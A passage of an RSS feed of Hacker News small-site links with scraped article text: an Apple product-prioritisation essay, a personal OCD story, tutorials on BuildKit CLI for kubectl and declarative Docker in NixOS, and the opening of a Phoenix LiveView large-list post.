<p><span data-ez-name="innovativebeast_com-medrectangle-1"><span><span><a href="https://www.ezoic.com/what-is-ezoic/" target="_blank" rel="noopener noreferrer nofollow"><img src="https://go.ezoic.net/utilcave_com/img/ezoic.png" alt="Ezoic"></a></span></span></span>
</p> </div></div>]]>
            </description>
            <link>https://innovativebeast.com/indias-very-own-messenger-hike-is-shutting-down/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716681</guid>
            <pubDate>Sun, 10 Jan 2021 17:01:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Applying Apple's Framework for Avoiding Mediocrity]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25716652">thread link</a>) | @sarthakjain
<br/>
January 10, 2021 | https://www.sarthakjain.com/p/apples-framework-for-escaping-mediocrity?r=86tsj | <a href="https://web.archive.org/web/*/https://www.sarthakjain.com/p/apples-framework-for-escaping-mediocrity?r=86tsj">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Note this isn't an official framework Apple uses internally. Neither this post nor the author are in any way affiliated with Apple. It is however a framework you can use to understand how Apple prioritizes building products and the closest outside guess to Apples product prioritization framework.</strong></p><h3>Mental Framework</h3><p>Every task or product decision should be put into one of 4 buckets:</p><p><strong>1. Not important.</strong></p><p>Don't do it. </p><p><strong>2. Not important. But needs to be done.</strong></p><p>Do the bare minimum</p><p><strong>3. Important</strong></p><p>As good as the best. Copy the best.</p><p><strong>4. Most important</strong>.</p><p>Innovate to make sure it’s better than the best.</p><h3>Isnt this obvious?</h3><p>It is mostly. However there is one notable exception. Average. If it's looking like what you are going to do is average you are better off doing the bare minimum.</p><p>If a task is between important and not important go either way do as good as best or bare minimum. Don't do average.</p><h3>Apple&nbsp;as an example:</h3><p>Apple is probably the most intense when using this framework. A great example is their history with headphones. For years Apple shipped below average headphones with their iPhones and iPods. Apple's headphones never competed with the likes of Bose. There was nothing new, nothing innovative about them. They needed to be there for Apple's core products to function and they were. They fell into the bucket of ‘2. Not important, but needs to be done.’ Apple even encouraged you to buy third party headphones.</p><p>Once Apple noticed a new innovative product that was gaining traction (the Bragi Dash on kickstarter, and possibly before this) they created a best in class product the Apple Air Pods. This suddenly took their headphone offering from below average to best in class. You could say they were copies of the best or they were better than the best but they certainly weren't average. This had become a category that was now important to Apple. Once the Air Pods took off Apple pushed it&nbsp;to the next level moving it to most important creating the Air Pods Pro leaving everyone in their dust.</p><p><strong>Other examples of products from Apple in each category</strong></p><ol><li><p>Search - Don't care, won't do </p></li><li><p>iCloud/Safari- I'd argue it's the bare minimum they can get away with </p></li><li><p>Airpods Max - as good as the best </p></li><li><p>MacBook/iPad - better than the best </p></li></ol><p>Even if you don't agree with the categorisation you'll probably still agree that Apple has below average products and best in class products but they don't create average products. That is why they have the market dominance they do.</p><p><strong>Even Apple fails occasionally:</strong></p><p>One example of Apple failing to follow this philosophy is in their maps product. Apple Maps really is a very “average” product which came nowhere close to competing with Google Maps. It's very existence necessitates doing more than the bare minimum which would have been to show Google Maps pre-installed. Word is that they are taking this shortcoming seriously and looking to launch a new redesigned Maps soon.</p><h3>Using this framework daily </h3><p>This was originally a slack post shared with the team at <a href="https://nanonets.com/">Nanonets</a>. We use this on a daily basis when scoping tasks. We ask ourselves:</p><p><strong>Do we need to do the bare minimum or best in class?</strong></p><p>Depending on the the answer:</p><p>A) If bare minimum then the follow up question is do we even need to do it? </p><p>B) If best in class should we copy the best or be better than the best?</p><p>If you don't hold yourself to this standard you will mostly end up shipping average features that lead to average products.</p><p><strong>Note</strong>: everything about your product need not be best in class. Only the the features that you matter to your customers and to you as a product/company, which also depends on and will change with the stage you are at.</p><p>I'm the CEO at <a href="https://nanonets.com/">Nanonets</a>, we are building AI to help machines see the world - starting with documents. </p><p>I write about startups, products and technology.</p></div></div>]]>
            </description>
            <link>https://www.sarthakjain.com/p/apples-framework-for-escaping-mediocrity?r=86tsj</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716652</guid>
            <pubDate>Sun, 10 Jan 2021 16:58:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I ignored my mental health, and got hit hard by OCD (a cautionary tale)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25716477">thread link</a>) | @coolvision
<br/>
January 10, 2021 | https://grgv.xyz/ocd_story | <a href="https://web.archive.org/web/*/https://grgv.xyz/ocd_story">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>Have you seen “Aviator”, a movie with Leonardo DiCaprio about Howard Hughes? Then you might recall what an OCD is.</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2fXF8G50BPQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<p><strong><a href="https://en.wikipedia.org/wiki/Obsessive%E2%80%93compulsive_disorder">Obsessive–compulsive disorder</a>&nbsp;(OCD) is a&nbsp;mental disorder&nbsp;in which a person has&nbsp;certain thoughts ”repeatedly&nbsp;(called "obsessions") or feels the need to perform&nbsp;certain routines repeatedly&nbsp;(called ”compulsions") to an extent which generates distress or impairs general functioning</strong></p>
<p>I have a mild form of OCD. Had it since teenage years. But rarely bothered me, and I mainly did not care about it much. It manifested itself maybe few times per year, where I would have to re-check few times if the door is locked, for example (which does not seem like a huge burden).</p>
<p>And so, I felt great in autumn and in the first half of December. Everything was fine, I have a job that I love, great family, and hobbies that I enjoy.</p>
<p>Then, this winter came, and It got worse. I live in a northern country (Estonia), daylight time is very short, and although I don’t suffer from SAD too much usually, it might have been a factor. And I usually try to get some vacation in warmer countries, but this year did not do it because of COVID. I also started to work from home, and it probably added to the feeling of isolation and brought me down more.</p>
<p>All in all, I don’t know what were that main factors, but probably the whole combination was too much. Occasional obsessions and compulsions started to show up more, but I mainly just shrugged them off. Then, closer to the new year, it stared to get even worse.</p>
<p><strong>And now it’s at a point where I strongly need professional help, I barely can work, lost lots of weight, have horrible anxiety all the time, and all the obsessions make my behaviour erratic at times.</strong> And this is yet another problem — its actually hard to find professional help quickly! It can be weeks or months until finding a therapist.</p>
<p><em>My main mistake was not looking for warning signs of illness.</em> It was “today it’s fine, then all will be fine” attitude, which is a big mistake.</p>
<p>Yes, my case is slightly exotic, but it relates to all other mental health issues: depression, anxiety, panic attacks, etc… <a href="https://www.nimh.nih.gov/health/statistics/mental-illness.shtml">Nearly 20% of people have some form of mental illness</a>, and some of the issues might not seem like a big deal until they hit hard.</p>
<p>As a tale of caution, I have some advice, which I will follow religiously in future. This is relatively obvious and simple, but let my example be a bit of a motivation to take it more seriously.</p>
<ul>
<li>Maintain mood logging, and journal regularly. It would help to notice any anomalies and problems before they become serious. Don’t shrug off warning signs!</li>
<li>Find mental health checklists, like <a href="https://www.beyondblue.org.au/the-facts/anxiety-and-depression-checklist-k10">https://www.beyondblue.org.au/the-facts/anxiety-and-depression-checklist-k10</a>, check yourself time from time,</li>
<li>Therapy is important, especially in this times. I never did therapy, and now regret it.</li>
<li>Fitness, meditation, good diet and all kinds of self care — in this time of increased isolation it’s not just some random good habits, treating this seriously is a very important part of well-being.</li>
</ul>


			</div></div>]]>
            </description>
            <link>https://grgv.xyz/ocd_story</link>
            <guid isPermaLink="false">hacker-news-small-sites-25716477</guid>
            <pubDate>Sun, 10 Jan 2021 16:43:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lifting developers’ productivity on Kubernetes with BuildKit CLI for kubectl]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25715910">thread link</a>) | @VadimBauer
<br/>
January 10, 2021 | https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/ | <a href="https://web.archive.org/web/*/https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Developing and testing software on Kubernetes usually means building and moving container images from the developer workstation to a container registry, and ultimately, Kubernetes. When considering all the moving parts, the complexity and context switches break the development flow. Gone are the days where developers just hit a command and a few seconds later the newly built software is ready for testing.</p><p>What if there was some magical tool that you could simply feed instructions like: “Build this Dockerfile <em>here</em> and replace any existing image on <em>that</em> Kubernetes cluster with the results!” ASAP. Spoiler Alert! That is exactly what BuildKit CLI for kubectl is there to do.</p><p>Building container images with Docker is the typical method for most users, but it is not the only option to build container images. In situations in which the workload is already running in a container, like Docker, Kubernetes, CI/CD pipeline or a serverless function, it is not always possible to run Docker.</p><p>Where the required Docker features may not have been available historically, alternative approaches emerged that only replicated the required functionality. In this post, we not only introduce a unique method for building container images with BuildKit CLI for kubectl, but we will also discuss two solutions that are sure to save developers hours of time and a much cleaner CI/CD pipeline.</p><p>Before we dive into the details, let’s break down Docker into its different functionalities. Docker as an application serves multiple purposes and in essence is a monolithic application holding multiple functionalities. This overview shows Docker’s functionalities and their single-purpose alternatives, allowing us to determine where BuildKit CLI for kubectl fits.</p><ul><li>Container engine: <a href="https://podman.io/">Podman</a></li><li>Container runtime: <a href="https://containerd.io/">containerd</a>, <a href="https://cri-o.io/">CRI-O</a></li><li>Image Build: <a href="https://github.com/moby/buildkit">BuildKit</a>, <a href="https://github.com/GoogleContainerTools/kaniko">Kaniko</a>, <a href="https://buildah.io/">Buildah</a></li><li>Inspection: <a href="https://github.com/wagoodman/dive">dive</a>, <a href="https://github.com/containers/skopeo">Skopeo</a></li></ul><p>Depending on the case, multiple single-purpose tools carved out of Docker exist that help replicate some needed Docker functionality. Even better, these tools usually work well together as <a href="https://opencontainers.org/">Open Container Initiative (OCI)</a>-conformant runtimes.</p><h2 id="buildkit-cli-for-kubectl">BuildKit CLI for kubectl</h2><p><a href="https://github.com/vmware-tanzu/buildkit-cli-for-kubectl">BuildKit CLI for kubectl</a> is a plugin for kubectl the Kubernetes command-line tool. The plugin extends the functionality of kubectl, allowing to build container images without a local Docker installation.</p><p>VMware <a href="https://blogs.vmware.com/opensource/2020/11/17/buildkit-cli-for-kubectl/">open sourced</a> BuildKit CLI for kubectl in 2020. The initial product announcement sums up pretty well the purpose of the tool:</p><blockquote><p>A key feature of this new tool is that it strives to make the images you build immediately available in the container runtime of your Kubernetes cluster so you can “bounce” your pod(s) to pick up a freshly built image with virtually no overhead.</p></blockquote><p>BuildKit CLI for kubectl has the following key features:</p><ul><li>Dockerfiles are parsed the same way as with the existing <code>docker build</code></li><li>Container images are built within Kubernetes, to leverage the power of your Kubernetes cluster</li><li>Builds OCI compatible images</li><li><a href="https://github.com/vmware-tanzu/buildkit-cli-for-kubectl/blob/main/docs/multiarch.md">Supports building multi-architecture images</a></li><li>No local registry needed for local Kubernetes development</li></ul><h2 id="inner-loop-productivity-flow">Inner-Loop Productivity Flow</h2><p>As developers, we spend a significant amount of time in the so-called “Inner Loop.” This is an iterative process where code is written, built, and tested repeatedly. All this takes place before we share our work with the team and the rest of the world, hence the need for code reviews and a CI workflow prior to pushing our completed work. The tight loop is the productive phase of the development process, therefore we want to spend as much time in the iterations as possible.</p><p>Iterations should be fast and with minimal friction. For example, if it takes 30 minutes to complete one loop, we can average around 10-12 loops a day. By shrinking that time to three minutes, we can theoretically make over 100 iterations of writing and testing code in a single day. That’s a huge productivity boost without “context switches” while waiting for your code to compile and deploy.</p><p>Mitch Denny has written an accurate <a href="https://web.archive.org/web/20201107102000/https://mitchdenny.com/the-inner-loop/">summary about the inner-loop</a> and how to tune it.<br></p><figure><img src="https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/Inner-loop-outer-loop.svg" alt="Inner Loop and outer Loop Development Workflow" width="75%"></figure><p>There are two ways to speed up the inner-loop. More hardware power to reduce the time it takes to build and deploy, or take some shortcuts by skiping steps in the cycle. BuildKit CLI for kubectl falls into the latter category. It allows us to skip superfluous steps, allowing us to reduce context switches to decrease wait time resulting in more iterations. The diagram above illustrates the two methods of deploying an application to Kubernetes. The common practice today is:</p><ul><li>Compile the code and package the artifacts</li><li>Build the container image locally</li><li>Push the container image to a container registry</li><li>Execute the deployment</li><li>Let Kubernetes pull the container image from the container registry</li><li>Start the application</li></ul><p>With BuildKit CLI for kubectl, the need to repeat all the steps every time we want to test our changes is no longer there. After the initial full cycle we only need our Kubernetes cluster to build the new image and restart the pods requiring updates. By mastering the lean image build workflow, it all should take less than a few seconds.</p><figure><img src="https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/workflow-with-buildkit-cli-for-kubectl.svg" alt="Common practice workflow with and without BuildKit CLI for kubectl" width="100%"></figure><p>Enough theory! Let us examine this workflow in practice and replace our local <code>docker build</code> with <code>kubectl build</code> for our Kubernetes development workflow.</p><h2 id="installation">Installation</h2><p>Download the binaries for your platform from github on <a href="https://github.com/vmware-tanzu/buildkit-cli-for-kubectl/releases">vmware-tanzu/buildkit-cli-for-kubectl/releases</a>.</p><p>The best way to work with kubectl plugins is to use <a href="https://krew.sigs.k8s.io/">Krew</a> the plugin manager for kubectl. Unfortunately, at the moment of writing, buildkit-cli-for-kubectl is <a href="https://github.com/vmware-tanzu/buildkit-cli-for-kubectl/issues/5">not supported yet</a>. Once the buildkit-cli-for-kubectl Krew plugin is available, the installation will be simple:</p><div><pre><code data-lang="sh">kubectl krew install buildkit-cli-for-kubectl
</code></pre></div><p>After downloading the binary for and extracting it:</p><div><pre><code data-lang="sh">cat darwin-*.tgz | tar -C /usr/local/bin -xvf -
<span>#This is an example for MacOS &amp; Linux</span>
</code></pre></div><p>We can verify the successful installation and the plugin registration with <code>kubectl</code></p><div><pre><code data-lang="sh">kubectl build --help
or
kubectl buildkit --help
</code></pre></div><p>The buildkit-cli-for-kubectl package contains two binaries: <code>buildkit</code> and <code>build</code> which is simply an alias for <code>buildkit build</code>.
Now that we have installed buildkit-cli-for-kubectl and verified its functionality, we can try to make something useful.</p><h2 id="example-application">Example Application</h2><p>For our example, we are going to use a simple Hello-World Go application. There is no need to install anything locally as the Golang toolset, and everything needed is within the Dockerfile.</p><p>Clone the minimum Hello-World application from <a href="https://github.com/container-registry/buildkit-cli-for-kubectl-demo-app">buildkit-cli-for-kubectl-demo-app</a></p><div><pre><code data-lang="sh">git clone https://github.com/container-registry/buildkit-cli-for-kubectl-demo-app.git
cd buildkit-cli-for-kubectl-demo-app
</code></pre></div><h3 id="building-an-image-with-buildkit-cli-for-kubectl">Building an Image with BuildKit CLI for kubectl</h3><p>To build container images, we need to have a Kubernetes cluster up and running. One easy option to set up a local Kubernetes cluster it to use <a href="https://minikube.sigs.k8s.io/">minikube</a> or <a href="https://k3d.io/">k3d</a>. Note that k3d needs <a href="https://github.com/vmware-tanzu/buildkit-cli-for-kubectl/blob/main/docs/installing.md#k3d">a workaround</a>.</p><p>To build a Container Image with BuildKit CLI for kubectl simply run:</p><div><pre><code data-lang="sh">kubectl build -t hello-world -f Dockerfile .
</code></pre></div><p>The CLI build syntax is the same as Docker build.
In this example, the first built took around ~70 seconds, which is not very impressive to be considered a quick iteration.</p><div><pre><code data-lang="sh">$ kubectl build -t 8gears.container-registry.com/examples/hello-world -f Dockerfile .
<span>[</span>+<span>]</span> Building 69.2s <span>(</span>17/17<span>)</span> FINISHED                                                                                                                                                                       
 <span>=</span>&gt; <span>[</span>internal<span>]</span> booting buildkit
 <span>=</span>&gt; <span>=</span>&gt; waiting <span>for</span> <span>1</span> pods to be ready 
 <span>=</span>&gt; <span>[</span>internal<span>]</span> load build definition from Dockerfile
 <span>=</span>&gt; <span>=</span>&gt; transferring dockerfile: 501B
 <span>=</span>&gt; <span>[</span>internal<span>]</span> load .dockerignore
 <span>=</span>&gt; <span>=</span>&gt; transferring context: 2B 
 <span>=</span>&gt; <span>[</span>internal<span>]</span> load metadata <span>for</span> docker.io/library/alpine:latest
 <span>=</span>&gt; <span>[</span>internal<span>]</span> load metadata <span>for</span> docker.io/library/golang:latest
 <span>=</span>&gt; <span>[</span>stage-1 1/4<span>]</span> FROM 
...
 <span>=</span>&gt; <span>[</span>builder 1/5<span>]</span> FROM 
...
 <span>=</span>&gt; <span>[</span>stage-1 2/4<span>]</span> RUN addgroup -S example-group <span>&amp;&amp;</span> adduser -S -D example -G example-group
 <span>=</span>&gt; <span>[</span>stage-1 3/4<span>]</span> WORKDIR /home/example
 <span>=</span>&gt; <span>[</span>builder 2/5<span>]</span> WORKDIR /hello-world
 <span>=</span>&gt; <span>[</span>builder 3/5<span>]</span> COPY go.mod .
 <span>=</span>&gt; <span>[</span>builder 4/5<span>]</span> COPY . .
 <span>=</span>&gt; <span>[</span>builder 5/5<span>]</span> RUN CGO_ENABLED<span>=</span><span>0</span> GOOS<span>=</span>linux GOARCH<span>=</span>amd64 go build -o /bin/hello-world .
 <span>=</span>&gt; <span>[</span>stage-1 4/4<span>]</span> COPY --from<span>=</span>builder /bin/hello-world ./
 <span>=</span>&gt; exporting to oci image format
 <span>=</span>&gt; <span>=</span>&gt; exporting layers
 <span>=</span>&gt; <span>=</span>&gt; exporting manifest sha256:...
 <span>=</span>&gt; <span>=</span>&gt; exporting config sha256:...
 <span>=</span>&gt; <span>=</span>&gt; sending tarball
 <span>=</span>&gt; loading image to docker runtime via pod buildkit-55fbd66677-m9v56  
</code></pre></div><p>However, the subsequent runs become much faster. This Kubernetes cluster can finish the build in 3.2 seconds, which is abut enough time to switch from the IDE to browser and hit refresh.</p><div><pre><code data-lang="sh">$ kubectl build -t 8gears.container-registry.com/examples/hello-world -f Dockerfile .
<span>[</span>+<span>]</span> Building 3.2s <span>(</span>16/16<span>)</span> FINISHED
</code></pre></div><p>We can also see a BuildKit deployment in our cluster.</p><div><pre><code data-lang="sh">$ kubectl get deploy

NAME             READY   UP-TO-DATE   AVAILABLE   AGE
buildkit         1/1     <span>1</span>            <span>1</span>           2m
</code></pre></div><blockquote><p>You would have to <a href="https://minikube.sigs.k8s.io/docs/handbook/registry/">enable registry</a> or <a href="https://stackoverflow.com/questions/42564058/how-to-use-local-docker-images-with-minikube">use some hack</a> to use local build image with Minikube. With BuildKit CLI for kubectl, this is optional.</p></blockquote><h3 id="deploying-an-application">Deploying an Application</h3><p>In the previous step, we only built a container image on remote Kubernetes cluster but never utilized it. A container image in a resting state like this within the Kubernetes cluster is quite useless. To prove that we can achieve a quick inner-loop cycle, let us deploy the hello-world application and measure how long it takes to get our change appear in the cluster.</p><p>The initial deployment:</p><div><pre><code data-lang="sh">$ kubectl apply -f deployment.yaml

deployment.apps/hello-world created
service/hello-world created
</code></pre></div><p>We can first verify the application deployment:</p><div><pre><code data-lang="sh">$ kubectl get deploy,svc

NAME                          READY   UP-TO-DATE   AVAILABLE   AGE
deployment.apps/buildkit      1/1     <span>1</span>            <span>1</span>           36m
deployment.apps/hello-world   1/1     <span>1</span>            <span>1</span>           4m19s

NAME                  TYPE        CLUSTER-IP     EXTERNAL-IP   PORT<span>(</span>S<span>)</span>   AGE
service/hello-world   ClusterIP   10.39.140.45   &lt;none&gt;        80/TCP    4m18s
</code></pre></div><p>To …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/">https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/</a></em></p>]]>
            </description>
            <link>https://container-registry.com/posts/productivity-lift-buildkit-cli-for-kubectl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715910</guid>
            <pubDate>Sun, 10 Jan 2021 15:56:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Declarative Docker Container Service in NixOS (2020)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715892">thread link</a>) | @alex_hirner
<br/>
January 10, 2021 | https://www.breakds.org/post/declarative-docker-in-nixos/ | <a href="https://web.archive.org/web/*/https://www.breakds.org/post/declarative-docker-in-nixos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h2 id="important-update-20200524">Important Update 2020.05.24</h2>
<p>After upgrading to 20.03 version of NixOS, the docker container starts
to use the container’s actual name instead of its systemd service’s
name to address the container. This means that to specify the database
container from the filerun web server’s container, you need to change
the value of <code>FR_DB_HOST</code> from <code>docker-filerun-mariadb.service</code> to
<code>filerun-mariadb</code>.</p>
<h2 id="the-problem">The Problem</h2>
<p>One of the biggest convenience you have in NixOS is that many of the
services you want to run are already coded as a “service”. This means
that you can easily spin up a service like openssh with</p>
<pre><code>services.openssh.enable = true;
</code></pre>
<p>In fact, you can find a whole lot of such predefined services with
<code>services.</code> prefix in the 
<a href="https://nixos.org/nixos/options.html#services." target="_blank" rel="noopener">NixOS
Options</a>
 site.</p>
<p>I also run 
<a href="https://www.filerun.com/" target="_blank" rel="noopener">FileRun</a>
 as my NAS server
(similar to 
<a href="https://nextcloud.com/" target="_blank" rel="noopener">NextCloud</a>
 but I found FileRun to
be more user friendly and hassle-free). The official 
<a href="https://docs.filerun.com/docker" target="_blank" rel="noopener">setup
guide</a>
 illustrated how to use 
<a href="https://docs.docker.com/compose/" target="_blank" rel="noopener">Docker
Compose</a>
 to run the service. I found
it ok to run the services with docker containers, but having to use
<code>docker-compose</code> to manage the containers make it <strong>less consistent</strong>
and <strong>less automatic</strong> comparing with my other services.</p>
<ol>
<li>Since the service is not managed in the NixOS configuration, I have
to manually bring it up and down with <code>docker-compose</code>.</li>
<li>All the other services are managed automatically, and the
declarative configuration makes them easier to manage. I want my
FileRun instance to enjoy that as well.</li>
<li>In the future I might want to have more container-based services.
Experimenting with nix-native docker container-based services can
be helpful for that purpose.</li>
</ol>
<p>Therefore, I decided to write a nix service to replace the
<code>docker-compose</code> based solution, which is then documentated in this
post.</p>
<h2 id="the-original-docker-compose">The Original Docker-Compose</h2>
<p>The docker compose (slightly adapted from the online doc provided by
FileRun) looks like below:</p>
<pre><code>version: '2'

services:
  db:
    image: mariadb:10.1
    environment:
      MYSQL_ROOT_PASSWORD: filerunpasswd
      MYSQL_USER: filerun
      MYSQL_PASSWORD: filerunpasswd
      MYSQL_DATABASE: filerundb
    volumes:
      - /home/delegator/filerun/db:/var/lib/mysql

  web:
    image: afian/filerun
    environment:
      FR_DB_HOST: db
      FR_DB_PORT: 3306
      FR_DB_NAME: filerundb
      FR_DB_USER: filerun
      FR_DB_PASS: filerunpasswd
      APACHE_RUN_USER: delegator
      APACHE_RUN_USER_ID: 600
      APACHE_RUN_GROUP: delegator
      APACHE_RUN_GROUP_ID: 600
    depends_on:
      - db
    links:
      - db:db
    ports:
      - "6000:80"
    volumes:
      - /home/delegator/filerun/web:/var/www/html
      - /home/delegator/filerun/user-files:/user-files
</code></pre>
<p>It basically defines 2 docker containers, one for the databse and one
for the FileRun web server itself, which is based on PHP and Apache. I
know little about both technologies (part of the reason why I left
them managed by docker containers with official images).</p>
<p>One thing that worths emphasizing is that in order to setup the
communication between those two containers, a <strong>link</strong> is configured
for the web server container.</p>
<h2 id="the-database-container">The Database Container</h2>
<p>With the new <code>docker-containers</code> option in NixOS configuration, bring
up the MariaDB docker container is as simple as</p>
<pre><code>docker-containers."filerun-mariadb" = {
  image = "mariadb:10.1";
  environment = {
    "MYSQL_ROOT_PASSWORD" = "randompasswd";
    "MYSQL_USER" = "filerun";
    "MYSQL_PASSWORD" = "randompasswd";
    "MYSQL_DATABASE" = "filerundb";
  };
  volumes = [ "/home/delegator/filerun/db:/var/lib/mysql" ];
};
</code></pre>
<p>This is basically a direct translation of the first half in the
previous docker-compose file. Nothing intresting yet.</p>
<p>To verify that it actually works, let’s run <code>docker ps</code>, and it will
show the container with name <code>docker-filerun-mariadb.service</code> (note
the naming convention). We can get into the docker container with</p>
<pre><code>$ docker exec -it docker-filerun-mariadb.service /bin/bash
</code></pre>
<p>And once you are in the docker, the command</p>
<pre><code>mysql -u filerun -prandompasswd filerundb
</code></pre>
<p>should get you connected to the database.</p>
<h2 id="setting-up-the-bridge-networks">Setting up the Bridge Networks</h2>
<p>By reading the documentation on 
<a href="https://docs.docker.com/network/bridge/" target="_blank" rel="noopener">docker
network</a>
, it becomes clear to
me that I need to create an user-defined bridge network to put the two
docker containers in it, so that they can communicate with each other.
This is to replicate the behavior “link” in the docker compose setup.</p>
<p>Bridge network can be created with the command <code>docker network create</code>. In order to ensure that such bridge network is up, I am using
a trick that I learned from 
<a href="https://kj.orbekk.com/" target="_blank" rel="noopener">KJ</a>
 - write a
oneshot systemd service do that.</p>
<pre><code>systemd.services.init-filerun-network-and-files = {
  description = "Create the network bridge filerun-br for filerun.";
  after = [ "network.target" ];
  wantedBy = [ "multi-user.target" ];
  
  serviceConfig.Type = "oneshot";
   script = let dockercli = "${config.virtualisation.docker.package}/bin/docker";
           in ''
             # Put a true at the end to prevent getting non-zero return code, which will
             # crash the whole service.
             check=$(${dockercli} network ls | grep "filerun-br" || true)
             if [ -z "$check" ]; then
               ${dockercli} network create filerun-br
             else
               echo "filerun-br already exists in docker"
             fi
           '';
};
</code></pre>
<p>This makes sure that the network will always be there when it is
needed. To add the db into the bridge network, one extra line would
solve the problem (see the last line).</p>
<pre><code>docker-containers."filerun-mariadb" = {
  image = "mariadb:10.1";
  environment = {
    "MYSQL_ROOT_PASSWORD" = "randompasswd";
    "MYSQL_USER" = "filerun";
    "MYSQL_PASSWORD" = "randompasswd";
    "MYSQL_DATABASE" = "filerundb";
  };
  volumes = [ "/home/delegator/filerun/db:/var/lib/mysql" ];
  extraDockerOptions = [ "--network=filerun-br" ];
};
</code></pre>
<h2 id="the-web-server-container">The Web Server Container</h2>
<p>The web server then follows pretty much the same way as the Database
container.</p>
<pre><code>docker-containers."filerun" = {
  image = "afian/filerun";
  environment = {
    "FR_DB_HOST" = "filerun-mariadb";  # !! IMPORTANT
    "FR_DB_PORT" = "3306";
    "FR_DB_NAME" = "filerundb";
    "FR_DB_USER" = "filerun";
    "FR_DB_PASS" = "randompasswd";
    "APACHE_RUN_USER" = "delegator";
    "APACHE_RUN_USER_ID" = "600";
    "APACHE_RUN_GROUP" = "delegator";
    "APACHE_RUN_GROUP_ID" = "600";
  };
  ports = [ "6000:80" ];
  volumes = [
    "/home/delegator/filerun/web:/var/www/html"
    "/home/delegator/filerun/user-files:/user-files"
  ];
  extraDockerOptions = [ "--network=filerun-br" ];
};
</code></pre>
<p>It is in the same bridge network. The most important line (marked
above) here is to set up the value for the environment variable
<code>"FR_DB_HOST"</code>. I did some experiment and found that within the same
bridge network, one container uses the other container’s name as the
hostname. Since NixOS’s <code>docker-containers</code> modules make the
convention of naming the container in such a way, I will just put the
other container’s name there <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>Important Notes</strong>: If you are using 19.09 or older version of NixOS,
the naming convention is actually different for docker containers.
Nothing more needs to be changed, just make sure your <code>FR_DB_HOST</code> is
set to <code>docker-filerun-mariadb.service</code> inated.</p>
<p>With those, everything should be up and running!</p>
<h2 id="conclusion">Conclusion</h2>
<p>A more comprehensive service for FileRun as demonstrated in this
article can be found

<a href="https://git.breakds.org/breakds/nixvital/src/branch/master/modules/services/filerun.nix" target="_blank" rel="noopener">here</a>
.
I omitted the details about how to add options and various
flexibilities to the service module in this article as those might be
distracting.</p>
<p>I found it to be very simple to spin up docker container based
services with the <code>docker-containers</code> module. Hope this can help you
as well.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>It would be much better if I can directly read the container’s
name from <code>config.docker-containers.filerun-mariadb</code>, so that it
would still work even if the naming convention changes. I could
not find such interface in <code>docker-containers</code> module though. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

    </div></div>]]>
            </description>
            <link>https://www.breakds.org/post/declarative-docker-in-nixos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715892</guid>
            <pubDate>Sun, 10 Jan 2021 15:55:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A hook for handling large lists with Phoenix Live View]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715878">thread link</a>) | @mpweiher
<br/>
January 10, 2021 | https://alex-min.fr/phoenix-live-view-very-large-list-hook/ | <a href="https://web.archive.org/web/*/https://alex-min.fr/phoenix-live-view-very-large-list-hook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <header>
    
    

    




    


  </header>

  <section>
    <p>I’m currently building a web version of my personal finance application, for that, I’ve chosen to use <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/phoenixframework/phoenix_live_view">Phoenix Live View</a>, it’s the perfect tech for my use case.</p>

<p>In this finance web application, you have a lot of very large lists to display like the list of transactions for example.
Each wallet can have between 2k and 20k transactions and it’s unreasonable to load everything at once. 
Loading everything slows down the initial page load with those large queries and then it also slows down the browser.</p>

<p>The solution is to build a list of transactions which is streamed as you go like on Fastmail or Gmail. 
The user has the impression that they can scroll down and that the full list is already there but in reality, everything is being streamed in chunks and loads as they scroll.</p>

<p>I’ve use <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/fulmicoton/fattable/">Fattable.js</a> for that purpose, it’s a small library which is making handling those large tables easier.</p>

<p>First, here is a preview of the end result:</p>

<video src="https://d33wubrfki0l68.cloudfront.net/e08e4212f821ef079db66ab61ab59b0e574fcc9a/fa8f0/videos/infinitescroll.mp4" muted="" autoplay="" loop="" controls="">
  <p>Video preview of the infinite scrolling where I scroll anywhere and you can see the list loading as I scroll dynamically</p>
</video>

<p>Now let’s dive into the code!</p>

<h2 id="the-live-view">The Live View</h2>

